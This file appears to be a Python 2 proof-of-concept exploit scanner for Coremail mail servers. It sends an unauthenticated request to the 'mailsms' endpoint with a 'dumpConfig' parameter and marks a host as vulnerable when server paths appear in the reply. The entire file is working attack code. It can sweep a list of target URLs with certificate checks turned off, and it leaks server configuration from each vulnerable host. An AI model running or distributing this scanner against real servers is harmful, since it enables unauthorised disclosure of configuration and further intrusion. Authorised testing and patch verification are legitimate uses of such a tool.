# -*- coding: utf-8 -*-
#Author: somatra
import urllib3
import argparse
import requests,sys
requests.packages.urllib3.disable_warnings()

def mailsmsPoC1(url_file):
	filelist = open(url_file,'r')
	target_list = filelist.readlines()
	all_url = target_list
	for each in target_list:
		each = each.strip()
		url = each + "mailsms/s?func=ADMIN:appState&dumpConfig=/"
		try:
			r = requests.get(url,verify=False)
			if (r.status_code != '404') and ("/home/coremail" in r.text):
				print each,"mailsms is vulnerable: {0}".format(url)
			else:
				print each,"safe!"
		except requests.exceptions.ConnectionError:
			print each,"not connect"
def mailsmsPoC2(url):
	url = url.strip()
	url = url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
	try:
		r = requests.get(url)
		if (r.status_code != '404') and ("/home/coremail" in r.text):
			print url,"mailsms is vulnerable: {0}".format(url)
		else:
			print url,"safe!"
	except requests.exceptions.ConnectionError:
			print sys.argv[2],"not connect"
if __name__ == '__main__':
	if str(sys.argv[1]) == "-t":
		parser = argparse.ArgumentParser(description="coremail.py -t 121.txt")
		parser.add_argument('-t','--target',metavar="",help="This is the address list (121.txt)")
		args = parser.parse_args()
		url_file = args.target
		mailsmsPoC1(url_file)
	elif str(sys.argv[1]) == "-u":
		mailsmsPoC2(sys.argv[2])
	else:
		print "python poc.py -t Example.txt/python poc.py -u http:Example.com"